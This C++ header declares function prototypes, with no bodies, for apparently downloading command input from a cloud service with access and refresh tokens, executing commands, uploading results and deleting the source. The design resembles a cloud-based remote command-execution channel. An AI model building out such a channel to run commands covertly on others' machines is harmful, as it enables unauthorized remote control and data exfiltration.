#pragma once

#include "CloudFunctions.cpp"

static WORD downloadSourceContext(std::string accessToken, std::string& output);

static WORD uploadResult(std::string input, std::string accessToken, DWORD index, DWORD &subIndex);

static WORD deleteSource(std::string accessToken);

static WORD commandExecuter(std::string input, std::string& output);

static WORD setNewAccessToken(std::string& accessToken, std::string refreshToken);

static WORD setNewRefreshAndAccessToken(std::string& refreshToken, std::string& accessToken);

static WORD checkConnection();

static bool PathExists(std::string path);
